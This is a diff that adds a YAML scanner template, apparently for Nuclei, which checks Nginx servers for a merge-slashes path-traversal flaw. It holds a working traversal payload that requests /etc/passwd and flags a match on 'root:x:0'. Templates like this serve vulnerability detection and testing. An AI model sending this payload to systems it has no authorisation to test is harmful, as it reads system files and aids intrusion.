@@ -1,0 +1,27 @@
+id: Nginx-merge-slashes-path-traversal
+
+info:
+  name: Nginx-merge-slashes-path-traversal
+  author: Momika233
+  severity: high
+  description: Nginx
+  reference:
+    - https://github.com/momika233
+  tags: Nginx,Path-Traversal
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/endpoint///////../../../../../../../etc/passwd'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
